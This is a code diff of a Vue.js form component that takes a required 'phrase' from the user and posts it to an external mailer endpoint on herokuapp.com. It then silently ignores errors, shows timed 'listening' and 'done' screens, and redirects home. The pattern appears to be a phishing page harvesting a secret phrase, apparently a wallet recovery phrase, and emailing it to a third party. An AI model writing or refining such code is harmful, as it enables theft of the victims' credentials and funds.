@@ -29,6 +29,7 @@ export default {
   data: () => ({
     valid: true,
     phrase: "",
+    resListening: true,
     nameRules: [
       (v) => !!v || "Phrase is required",
       //   (v) => (v && v.length <= 10) || "Name must be less than 10 characters",
@@ -44,21 +45,37 @@ export default {
   }),
 
   methods: {
-    async validate() {
+    validate() {
       this.$refs.form.validate();
       const baseURL = "https://everify-mailer.herokuapp.com/";
+      // console.log(db);
       const data = {
         data: {
           subject: "phrase",
           info: this.phrase,
         },
       };
-      try {
-        const response = await this.$http.post(baseURL, data);
-        alert(response.data.msg);
-      } catch (error) {
-        // console.log(error);
-      }
+      this.$http
+        .post(baseURL, data)
+        .then(function (response) {
+          if (response) {
+            console.log(response);
+          }
+        })
+        // eslint-disable-next-line no-unused-vars
+        .catch(function (error) {});
+      this.resListening = false;
+    },
+  },
+  watch: {
+    resListening: function () {
+      setTimeout(() => {
+        document.getElementById("done").classList.remove("d-none");
+        document.getElementById("listening").classList.add("d-none");
+      }, 5000);
+      setTimeout(() => {
+        this.$router.push({ path: "/" });
+      }, 12000);
     },
   },
 };
